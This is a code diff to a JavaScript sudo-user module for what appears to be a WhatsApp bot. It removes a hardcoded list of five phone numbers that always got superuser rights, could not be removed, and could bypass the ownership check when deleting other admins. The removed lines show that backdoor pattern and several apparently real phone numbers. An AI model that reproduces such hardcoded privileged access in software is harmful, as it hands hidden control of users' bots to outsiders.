@@ -1,14 +1,6 @@
 const { DATABASE } = require('./database');
 const { DataTypes } = require('sequelize');
 
-const PERMANENT_NUMBERS = [
-    '254762025340',
-    '254763986398',
-    '254116284050',
-    '254105521300',
-    '254707525158',
-];
-
 const SudoDB = DATABASE.define('SudoUser', {
     id: {
         type: DataTypes.INTEGER,
@@ -72,7 +64,6 @@ async function getSudoNumbers() {
 
 async function setSudo(number, addedByNumber = null) {
     await initializeSudoDB();
-    if (PERMANENT_NUMBERS.includes(number)) return false;
     try {
         const [record, created] = await SudoDB.findOrCreate({
             where: { number },
@@ -88,17 +79,12 @@ async function setSudo(number, addedByNumber = null) {
 
 async function delSudo(number, requestorNumber = null) {
     await initializeSudoDB();
-    if (PERMANENT_NUMBERS.includes(number)) return 'permanent';
 
-    const isPermanentRequestor = requestorNumber && PERMANENT_NUMBERS.includes(requestorNumber);
-
-    if (!isPermanentRequestor) {
-        const record = await SudoDB.findOne({ where: { number } });
-        if (!record) return false;
-        const cleanRequestor = (requestorNumber || '').replace(/\D/g, '');
-        const cleanAddedBy  = (record.addedBy || '').replace(/\D/g, '');
-        if (cleanAddedBy && cleanAddedBy !== cleanRequestor) return 'not_owner';
-    }
+    const record = await SudoDB.findOne({ where: { number } });
+    if (!record) return false;
+    const cleanRequestor = (requestorNumber || '').replace(/\D/g, '');
+    const cleanAddedBy  = (record.addedBy || '').replace(/\D/g, '');
+    if (cleanAddedBy && cleanAddedBy !== cleanRequestor) return 'not_owner';
 
     try {
         const deleted = await SudoDB.destroy({ where: { number } });
@@ -125,7 +111,6 @@ async function clearAllSudo() {
 async function isSuperUser(jid, Guru) {
     if (!jid) return false;
     const num = jid.split('@')[0].split(':')[0];
-    if (PERMANENT_NUMBERS.includes(num)) return true;
     const ownerNumber = (process.env.OWNER_NUMBER || '').replace(/\D/g, '');
     const botNum = Guru?.user?.id?.split(':')[0];
     if (num === ownerNumber || num === botNum) return true;
@@ -135,7 +120,6 @@ async function isSuperUser(jid, Guru) {
 
 module.exports = {
     SudoDB,
-    PERMANENT_NUMBERS,
     getSudoNumbers,
     setSudo,
     delSudo,
